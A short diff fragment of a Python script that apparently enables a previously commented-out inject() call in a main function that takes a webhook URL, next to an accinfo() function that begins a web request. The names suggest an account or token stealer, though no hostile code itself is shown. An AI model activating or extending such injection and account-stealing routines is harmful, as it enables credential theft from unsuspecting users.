@@ -50,7 +50,7 @@ def main(webhook_url):
 
     cleanup()
 
-    # inject()
+    inject()
     
 def accinfo():
     r = requests.get(
